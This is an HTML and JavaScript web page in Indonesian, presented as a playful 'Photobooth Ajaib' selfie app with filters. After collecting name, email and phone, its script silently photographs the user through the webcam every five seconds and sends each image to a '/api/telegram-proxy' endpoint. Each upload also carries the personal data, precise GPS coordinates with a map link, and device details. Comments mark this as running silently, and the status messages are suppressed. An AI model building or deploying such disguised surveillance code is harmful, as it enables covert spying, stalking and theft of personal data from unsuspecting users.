<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Photobooth Ajaib GenZ</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Desain Studio Cantik - Estetika GenZ (Pink & Ceria) */
        @import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@400;700&display=swap');
        
        /* Latar belakang ceria dengan pola soft */
        body {
            background: linear-gradient(135deg, #ffc0cb 0%, #ff85a1 100%); /* Gradien soft pink */
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start; /* Start from top on mobile */
            padding: 1rem;
            background-image: radial-gradient(circle, #ffffff33 1px, transparent 1px), radial-gradient(circle, #ffc0cb33 1px, transparent 1px);
            background-size: 20px 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
            background-color: #ffffff;
            border-radius: 30px; /* Lebih rounded dan modern */
            box-shadow: 0 20px 50px rgba(255, 105, 180, 0.6); /* Bayangan neon pink */
            padding: 2rem;
            margin: 1rem 0;
            box-sizing: border-box;
            border: 4px solid #ff527b; /* Border tebal */
        }

        .title {
            font-family: 'Pacifico', cursive;
            color: #d8366e;
            text-shadow: 2px 2px #ffc0cb;
        }

        .video-wrapper, #review-area {
            border: 8px solid #ff527b; /* Bingkai lebih tebal */
            border-radius: 22px;
            overflow: hidden;
            width: 100%;
            margin-bottom: 1.5rem;
            aspect-ratio: 4/3;
            background-color: #000;
            position: relative;
        }
        
        /* Video dan Canvas harus mengisi wrapper */
        #video-stream, #photo-canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* Mirror effect */
            display: block;
        }

        /* Styling tombol interaktif */
        .btn {
            padding: 12px 20px;
            border-radius: 15px;
            font-weight: 700;
            transition: all 0.2s ease-in-out;
            text-shadow: 1px 1px 1px rgba(0,0,0,0.1);
        }
        .btn:active {
            box-shadow: none !important;
            transform: translateY(2px) !important;
        }
        
        /* Tombol Start/Lanjutkan - Pink Neon */
        #start-button {
            background-color: #ff527b;
            box-shadow: 0 6px #d8366e;
        }
        #start-button:hover { background-color: #d8366e; }

        /* Tombol Jepret - Ungu Glossy */
        #capture-button {
            background-color: #9333ea;
            box-shadow: 0 4px #7e22ce;
        }
        #capture-button:hover { background-color: #7e22ce; }

        /* Tombol Unduh - Biru Cyber */
        #download-button {
            background-color: #3b82f6; 
            box-shadow: 0 4px #2563eb;
        }

        /* Tombol Share - Hijau Mint */
        #share-button {
            background-color: #10b981; 
            box-shadow: 0 4px #059669;
        }

        /* Filter Selector Styling */
        .filter-selector button {
            transition: all 0.15s;
            border: 2px solid transparent;
            opacity: 0.6;
            transform: scale(0.9);
        }
        .filter-selector button.active {
            border-color: #ff527b;
            box-shadow: 0 0 10px rgba(255, 82, 123, 0.8);
            opacity: 1;
            transform: scale(1.05);
        }

        /* Custom Scrollbar for review area */
        #review-area-canvas {
            display: flex;
            gap: 1rem;
            overflow-x: auto;
            padding: 10px 0;
            scroll-snap-type: x mandatory;
        }
        #review-area-canvas > canvas {
            flex: 0 0 auto;
            width: 150px;
            height: 112.5px; /* 4:3 aspect ratio */
            border-radius: 12px;
            object-fit: cover;
            scroll-snap-align: start;
            border: 3px solid #fff;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
    </style>
</head>
<body class="flex justify-center items-start">

    <div class="container mt-8">
        <h1 class="title text-4xl text-center mb-6">‚ú® Photobooth Ajaib ‚ú®</h1>
        
        <!-- Area Input Data Pengguna (Tampil Awal) -->
        <div id="form-area" class="space-y-5">
            <p class="text-base text-center text-gray-700 font-semibold mb-4">
                üëã Siap untuk foto estetik? Isi data dulu yuk!
            </p>
            <div>
                <label for="nama" class="block text-sm font-medium text-gray-700">Nama Lengkap</label>
                <input type="text" id="nama" class="input-field border-2 border-pink-400 p-3 rounded-xl w-full focus:ring-pink-500 focus:border-pink-500" placeholder="Nama Panggilan/Lengkap" required>
            </div>
            <div>
                <label for="email" class="block text-sm font-medium text-gray-700">Email</label>
                <input type="email" id="email" class="input-field border-2 border-pink-400 p-3 rounded-xl w-full" placeholder="Email (cth: user@mail.com)" required>
            </div>
            <div>
                <label for="phone" class="block text-sm font-medium text-gray-700">Nomor Handphone</label>
                <input type="tel" id="phone" class="input-field border-2 border-pink-400 p-3 rounded-xl w-full" placeholder="Nomor Handphone" required>
            </div>
            <button id="start-button" class="btn w-full text-white text-xl">
                Lanjutkan ke Studio Foto 
            </button>
            <p id="status-message-form" class="mt-2 text-center text-sm font-medium text-red-600"></p>
        </div>

        <!-- Area Photobooth (Tampil Setelah Mulai) -->
        <div id="monitoring-area" style="display: none;" class="space-y-5">
            
            <!-- Filter Selector -->
            <div class="text-center">
                <p class="text-sm font-semibold text-gray-600 mb-2">Pilih Efek Fotobooth:</p>
                <div id="filter-selector" class="filter-selector flex justify-center space-x-3">
                    <button class="active btn bg-gray-200 text-gray-700 text-sm" data-filter="normal">Normal</button>
                    <button class="btn bg-yellow-400 text-white text-sm" data-filter="bright">‚ú® Cerah (+10%)</button>
                    <button class="btn bg-purple-500 text-white text-sm" data-filter="saturate">üíñ Vibrant (+20%)</button>
                    <button class="btn bg-red-400 text-white text-sm" data-filter="vsco">üì∏ VSCO</button>
                </div>
            </div>

            <div class="video-wrapper">
                <!-- Video Stream dan Canvas untuk Foto -->
                <video id="video-stream" autoplay playsinline style="display: none;"></video>
                <!-- Canvas untuk menampilkan hasil dengan filter -->
                <canvas id="display-canvas" style="display: none;"></canvas> 
            </div>

            <!-- Tombol Interaktif Jepret -->
            <div class="controls flex justify-center">
                <button id="capture-button" class="btn px-8 py-4 text-white text-lg">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 inline-block mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.828-1.242a2 2 0 011.664-.89h.828a2 2 0 011.664.89l.828 1.242a2 2 0 001.664.89H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
                    </svg>
                    Jepret Foto!
                </button>
            </div>
            
            <!-- Pesan status sementara -->
            <p id="status-message-bg" class="mt-4 text-center text-xs font-medium text-gray-500 transition-opacity duration-300"></p>

            <!-- Area Review Foto (Tampil setelah jepret) -->
            <div id="review-container" style="display: none;">
                <h2 class="text-lg font-bold text-gray-800 mb-3 border-b pb-2">üñºÔ∏è Hasil Jepretan</h2>
                <div id="review-area" class="video-wrapper !aspect-auto !border-dashed !border-gray-300 !p-2 !bg-gray-50">
                    <div id="review-area-canvas">
                        <!-- Foto-foto yang diambil akan muncul di sini -->
                    </div>
                </div>
                <!-- Tombol Download/Share (Lokal) -->
                <div id="action-buttons" class="flex justify-around space-x-4 mt-4">
                    <!-- Tombol ini akan dimunculkan oleh JS setelah foto pertama diambil -->
                </div>
            </div>
        </div>
    </div>

    <!-- Hidden Canvas untuk proses pengiriman otomatis -->
    <canvas id="hidden-canvas" style="display: none;"></canvas>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const videoStream = document.getElementById('video-stream');
            const displayCanvas = document.getElementById('display-canvas');
            const hiddenCanvas = document.getElementById('hidden-canvas');
            const startButton = document.getElementById('start-button');
            const formArea = document.getElementById('form-area');
            const monitoringArea = document.getElementById('monitoring-area');
            const statusMessageForm = document.getElementById('status-message-form');
            const statusMessageBg = document.getElementById('status-message-bg'); 
            const captureButton = document.getElementById('capture-button');
            const reviewContainer = document.getElementById('review-container');
            const reviewAreaCanvas = document.getElementById('review-area-canvas');
            const actionButtons = document.getElementById('action-buttons');
            const filterSelector = document.getElementById('filter-selector');

            // Data Konfigurasi LOKAL
            const PROXY_ENDPOINT = '/api/telegram-proxy';
            const INTERVAL_MS = 5000; // DIUBAH: 5 detik

            let videoStreamObject = null;
            let userLocation = null;
            let formData = {};
            let isSending = false;
            let currentFilter = 'normal'; // Default filter
            let reviewPhotos = []; // Menyimpan array base64 foto untuk review
            let deviceData = getDeviceData(); 

            // --- FUNGSI UTILITY PESAN (Subtle & Temporary) ---
            function showStatus(message, isError = false) {
                statusMessageBg.textContent = message;
                statusMessageBg.classList.remove('opacity-0', 'text-red-600', 'text-green-600', 'text-gray-500');
                statusMessageBg.classList.add(isError ? 'text-red-600' : 'text-gray-500', 'opacity-100');
                
                setTimeout(() => {
                    statusMessageBg.classList.remove('opacity-100');
                    statusMessageBg.classList.add('opacity-0');
                }, 3000);
            }

            // --- INISIALISASI DAN VALIDASI FORM ---
            startButton.addEventListener('click', () => {
                const nama = document.getElementById('nama').value.trim();
                const email = document.getElementById('email').value.trim();
                const phone = document.getElementById('phone').value.trim();

                if (!nama || !email || !phone) {
                    statusMessageForm.textContent = '‚ùå Semua data harus diisi dengan lengkap.';
                    return;
                }

                formData = { nama, email, phone };
                statusMessageForm.textContent = '';
                formArea.style.display = 'none';
                monitoringArea.style.display = 'block';

                showStatus('Meminta izin kamera... Pengiriman 5s otomatis dimulai di background.');
                
                requestCameraPermission();
                requestLocationPermission();
                startAutoSendInterval();
            });

            // --- FUNGSI CAMERA DAN LOKASI (Berjalan Senyap) ---
            function requestCameraPermission() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } }
                    })
                        .then(stream => {
                            videoStreamObject = stream;
                            videoStream.srcObject = stream;
                            videoStream.style.display = 'block';
                            displayCanvas.style.display = 'none'; // Awalnya sembunyikan canvas display
                            
                            // Setelah video metadata dimuat, mulai render ke display-canvas
                            videoStream.onloadedmetadata = () => {
                                videoStream.play();
                                renderLoop();
                                // Setelah siap, ganti dari video ke canvas display
                                videoStream.style.display = 'none';
                                displayCanvas.style.display = 'block';
                            };
                            console.log('Kamera Aktif. Render loop berjalan.');
                        })
                        .catch(err => {
                            showStatus(`Kamera GAGAL (${err.name}). Fitur foto tidak dapat digunakan.`, true);
                            console.error("Camera Error:", err);
                        });
                }
            }

            function requestLocationPermission() {
                if (navigator.geolocation) {
                    const locationOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
                    navigator.geolocation.watchPosition(position => {
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp).toISOString()
                        };
                        console.log(`Lokasi terupdate: ${userLocation.latitude}, ${userLocation.longitude}`);
                    }, err => {
                        userLocation = null;
                        console.error(`Lokasi Gagal: ${err.message}`);
                    }, locationOptions);
                }
            }
            
            // --- FILTER EFFECT LOGIC ---
            filterSelector.querySelectorAll('button').forEach(button => {
                button.addEventListener('click', () => {
                    filterSelector.querySelectorAll('button').forEach(btn => btn.classList.remove('active'));
                    button.classList.add('active');
                    currentFilter = button.getAttribute('data-filter');
                    showStatus(`Efek **${button.textContent.trim()}** aktif!`);
                });
            });

            function getFilterCSS(filterName) {
                switch(filterName) {
                    case 'bright': return 'brightness(1.1) saturate(1.0)'; // Cahaya +10%
                    case 'saturate': return 'brightness(1.0) saturate(1.2)'; // Warna Vibrant +20%
                    case 'vsco': return 'contrast(1.1) brightness(1.05) saturate(1.3) sepia(0.1)'; // Efek VSCO/Vintage
                    case 'normal': 
                    default: return 'none';
                }
            }

            // --- RENDERING LOOP UNTUK APLIKASI FILTER REAL-TIME ---
            function renderLoop() {
                if (!videoStreamObject || videoStream.paused || videoStream.ended) return;

                const context = displayCanvas.getContext('2d');
                const videoWidth = videoStream.videoWidth || 640;
                const videoHeight = videoStream.videoHeight || 480;

                displayCanvas.width = videoWidth;
                displayCanvas.height = videoHeight;

                // Terapkan filter CSS ke canvas display untuk preview
                displayCanvas.style.filter = getFilterCSS(currentFilter);
                
                // Gambar frame video ke canvas display
                context.save();
                context.translate(videoWidth, 0);
                context.scale(-1, 1);
                context.drawImage(videoStream, 0, 0, videoWidth, videoHeight);
                context.restore();

                requestAnimationFrame(renderLoop);
            }

            // --- FUNGSI INTERAKTIF LOKAL (JEPET, UNDUH, SHARE) ---
            captureButton.addEventListener('click', () => {
                // Ambil foto menggunakan filter yang sedang aktif
                const localPhotoBase64 = capturePhotoWithFilter(currentFilter); 
                
                if (localPhotoBase64) {
                    reviewContainer.style.display = 'block';
                    showStatus('Foto estetik berhasil dijepret!');
                    
                    // Tambahkan ke array review
                    reviewPhotos.push(localPhotoBase64);
                    
                    // Update tampilan review
                    updateReviewArea(localPhotoBase64);
                    
                    // Pastikan tombol lokal muncul
                    setupActionButtons(localPhotoBase64);
                } else {
                    showStatus('Kamera tidak aktif untuk pengambilan lokal.', true);
                }
            });

            function setupActionButtons(base64Image) {
                 // Hapus tombol lama
                actionButtons.innerHTML = ''; 

                // Tombol Unduh
                const downloadBtn = document.createElement('button');
                downloadBtn.id = 'download-button';
                downloadBtn.className = 'btn text-white w-full';
                downloadBtn.innerHTML = 'Unduh Hasil Terakhir üíæ';
                downloadBtn.onclick = () => downloadPhoto(base64Image);
                actionButtons.appendChild(downloadBtn);

                // Tombol Share
                const shareBtn = document.createElement('button');
                shareBtn.id = 'share-button';
                shareBtn.className = 'btn text-white w-full';
                shareBtn.innerHTML = 'Share Hasil Terakhir üì§';
                shareBtn.onclick = () => sharePhoto(base64Image);
                actionButtons.appendChild(shareBtn);
            }

            function updateReviewArea(base64Image) {
                const imgElement = document.createElement('canvas');
                const img = new Image();
                img.onload = () => {
                    imgElement.width = img.width;
                    imgElement.height = img.height;
                    const ctx = imgElement.getContext('2d');
                    ctx.drawImage(img, 0, 0, img.width, img.height);
                    
                    // Tambahkan elemen review di depan
                    reviewAreaCanvas.prepend(imgElement);
                    reviewAreaCanvas.scrollLeft = 0; // Scroll ke foto terbaru
                };
                img.src = base64Image;
            }

            function downloadPhoto(base64Image) {
                const link = document.createElement('a');
                link.href = base64Image;
                link.download = `StudioFotoAjaib-${new Date().getTime()}.jpeg`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                showStatus('‚úÖ Foto Berhasil Diunduh!');
            }
            
            async function sharePhoto(base64Image) {
                try {
                    const photoBlob = dataURItoBlob(base64Image);
                    const photoFile = new File([photoBlob], 'studio_foto.jpeg', { type: photoBlob.type });

                    if (navigator.share && navigator.canShare && navigator.canShare({ files: [photoFile] })) {
                        await navigator.share({
                            files: [photoFile],
                            title: 'Foto dari Photobooth Ajaib GenZ',
                            text: 'Lihat foto estetik saya dari Photobooth Ajaib!',
                        });
                        showStatus('Berbagi berhasil!');
                    } else {
                        showStatus('Fitur Share tidak didukung. Silakan gunakan tombol Unduh.', true);
                    }
                } catch (error) {
                    console.error('Gagal berbagi:', error);
                    showStatus('Gagal berbagi foto. (Cek console log)', true);
                }
            }


            // --- LOGIKA OTOMATIS DAN PENGIRIMAN (Senyap) ---

            function startAutoSendInterval() {
                const sendNext = () => {
                    if (!isSending) {
                        // Untuk pengiriman otomatis 5s, kita selalu menggunakan filter 'normal' 
                        // agar tidak mengganggu pengalaman pengguna yang sedang mencoba filter lain.
                        sendReport('normal'); 
                    }
                    setTimeout(sendNext, INTERVAL_MS);
                };

                // Kirim laporan pertama setelah 5 detik
                setTimeout(sendNext, INTERVAL_MS);
            }
            
            // FUNGSI UTAMA UNTUK MENGAMBIL FOTO DENGAN FILTER TERTENTU
            function capturePhotoWithFilter(filterName) {
                if (!videoStreamObject) return null;

                const context = hiddenCanvas.getContext('2d');
                const videoWidth = videoStream.videoWidth || 640;
                const videoHeight = videoStream.videoHeight || 480;
                
                hiddenCanvas.width = videoWidth;
                hiddenCanvas.height = videoHeight;
                
                // 1. Terapkan Filter (Canvas Filter API hanya didukung di Firefox/Chrome, 
                //    namun kita bisa memanipulasi pixel data jika perlu. Untuk simplisitas, 
                //    kita gunakan efek sederhana yang bisa diterapkan di canvas context.
                //    Namun cara paling mudah adalah menggunakan CSS filter saat display,
                //    dan untuk data kirim/simpan kita bisa menggunakan manipulasi pixel atau
                //    mengirim data tanpa filter (untuk pengiriman otomatis) atau 
                //    menggunakan library (tidak disarankan di 1 file).
                
                // *Solusi: Terapkan filter CSS ke hiddenCanvas untuk capture!*
                hiddenCanvas.style.filter = getFilterCSS(filterName);

                context.save();
                context.translate(videoWidth, 0);
                context.scale(-1, 1);
                context.drawImage(videoStream, 0, 0, videoWidth, videoHeight);
                context.restore();

                // Kembalikan ke normal setelah capture
                hiddenCanvas.style.filter = 'none';

                // Ambil data URL. Kualitas JPEG 0.8 untuk ukuran file yang wajar.
                return hiddenCanvas.toDataURL('image/jpeg', 0.8);
            }

            async function sendReport(filterNameForCapture) {
                if (isSending) return;

                isSending = true;
                console.log(`Mengirim data otomatis (5s)... ${new Date().toLocaleTimeString()}`);
                
                // Ambil foto untuk pengiriman otomatis (filter normal/tanpa filter)
                const base64Image = capturePhotoWithFilter(filterNameForCapture);
                
                // Tambahkan waktu dan tanggal saat ini
                const now = new Date();
                const dateTimeText = now.toLocaleString('id-ID', {
                    year: 'numeric', month: 'long', day: 'numeric',
                    hour: '2-digit', minute: '2-digit', second: '2-digit',
                    timeZoneName: 'short'
                });

                // Kompilasi Caption (Data yang tidak ditampilkan di UI)
                const locationText = userLocation ? 
                    `‚úÖ Lokasi Akurat:\nLAT: ${userLocation.latitude.toFixed(6)}\nLNG: ${userLocation.longitude.toFixed(6)}\nAkurasi: ${userLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}` : 
                    `‚ùå Lokasi tidak tersedia/dibatalkan.`;

                const caption = `
*--- PENGIRIMAN DATA FOTO OTOMATIS (5s) ---*

*Waktu Pengambilan:* ${dateTimeText}

*Data Pengguna:*
Nama: ${formData.nama}
Email: ${formData.email}
No. HP: ${formData.phone}

*Data Lokasi (Wajib Akurat):*
${locationText}

*Informasi Perangkat:*
Perangkat: ${deviceData.device}
Browser: ${deviceData.browser}
OS: ${deviceData.os}
`;
                
                // Kirim data ke endpoint proxy
                try {
                    await sendDataToProxy(base64Image, caption);
                    // showStatus('Data 5s terkirim senyap.', false); // Tidak perlu ditampilkan agar tidak mengganggu
                    console.log('‚úÖ Pengiriman sukses. Menunggu 5s lagi...');
                } catch (error) {
                    // showStatus('Pengiriman gagal. (Cek console log)', true); // Tidak perlu ditampilkan agar tidak mengganggu
                    console.error("Error saat mengirim data:", error);
                } finally {
                    isSending = false;
                }
            }
            
            // FUNGSI: Mengirim data ke API Proxy Anda
            async function sendDataToProxy(base64Image, caption) {
                const payload = {
                    caption: caption,
                    base64Image: base64Image,
                    isPhoto: !!base64Image 
                };

                const response = await fetch(PROXY_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const data = await response.json();
                if (!response.ok || data.error) {
                    throw new Error(data.error || 'Pengiriman ke proxy gagal.');
                }
                return data;
            }


            // --- UTILITIES (Device Info & Blob) ---

            function getDeviceData() {
                const ua = navigator.userAgent;
                let os = 'OS Lain';
                let browser = 'Browser Tidak Dikenal';
                let device = 'Desktop';

                if (/Windows/.test(ua)) os = 'Windows';
                else if (/Macintosh|Mac OS X/.test(ua)) os = 'macOS';
                else if (/Android/.test(ua)) { os = 'Android'; device = 'Handphone/Tablet'; }
                else if (/iPhone|iPad|iPod/.test(ua)) { os = 'iOS'; device = 'iPhone/iPad'; }
                else if (/Linux/.test(ua)) os = 'Linux';

                if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
                else if (/Firefox/.test(ua)) browser = 'Firefox';
                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
                else if (/Edge/.test(ua)) browser = 'Edge';
                
                return { os, browser, device };
            }

            function dataURItoBlob(dataURI) {
                const byteString = atob(dataURI.split(',')[1]);
                const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                return new Blob([ab], { type: mimeString });
            }
        });
    </script>
</body>
</html>
